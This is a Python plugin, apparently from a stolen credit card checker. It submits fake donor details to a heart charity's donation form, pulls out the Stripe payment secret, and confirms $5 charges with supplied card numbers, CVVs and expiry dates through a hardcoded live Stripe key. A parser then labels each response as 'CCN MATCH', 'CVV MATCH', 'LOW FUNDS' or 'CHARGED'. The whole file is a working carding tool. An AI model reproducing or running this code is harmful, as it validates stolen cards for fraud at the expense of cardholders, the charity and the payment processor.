import requests
from mills.plugins._helpers.tools import find_between
# from joc.classes.RandUser import RandUser


def chk_one(r,rand_user):
    
    a = r.get('https://www.heartuk.org.uk/donate/single-donation/submit')
    if not a: return

    b_data = {
    'amount': '5',
    'otheramount': '',
    'title': 'Mr',
    'title_other_value': '',
    'firstname': rand_user['first_name'],
    'lastname': rand_user['last_name'],
    'country': 'United States',
    'postcode': rand_user['zip'],
    'address1': rand_user['street'],
    'address2': '',
    'town': rand_user['city'],
    'county': rand_user['state'],
    'telephone': rand_user['phone'],
    'email': rand_user['email'],
    'contact_pref_4': '1',
    'donation_submit': 'Next step',
    }

    # b = r.post('https://hobanz.org.nz/donate/setamount', b_data)

    # SecurityID = find_between(b.text, 'SecurityID" value="','"')

    # if not SecurityID: return
    # c_data = {
    # 'FirstName': rand_user['first_name'],
    # 'Surname': rand_user['last_name'],
    # 'Email': rand_user['email'],
    # 'Company': '',
    # 'Phone': rand_user['phone'],
    # 'SecurityID': SecurityID,
    # }

    c = r.post('https://www.heartuk.org.uk/donate/single-donation/submit', b_data)
    confirmCardPayment = find_between(c.text, 'stripe.handleCardPayment(','",')
    if not confirmCardPayment: return
    return confirmCardPayment.replace('"','')


 
def chk_two(r, sec, cc, mes,ano, cvv, rand_user):
    req_sec = sec.split('_secret')[0]
    payload_e = {
    'payment_method_data[type]': 'card',
    'payment_method_data[billing_details][name]': rand_user['name'],
    'payment_method_data[billing_details][email]': rand_user['email'],
    'payment_method_data[card][number]': cc,
    'payment_method_data[card][cvc]': cvv,
    'payment_method_data[card][exp_month]': mes,
    'payment_method_data[card][exp_year]': ano,
    'payment_method_data[guid]': 'NA',
    'payment_method_data[muid]': 'NA',
    'payment_method_data[sid]': 'NA',
    'payment_method_data[payment_user_agent]': 'stripe.js/653c2107b; stripe-js-v3/653c2107b',
    'payment_method_data[time_on_page]': '55245',
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_b0Wwz4q7JcwFqfqBjmSkndzv',
    'client_secret': sec,
    }

    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{req_sec}/confirm', data = payload_e)
    return e.json()




def get_response_chk(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "CHARGED $5", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo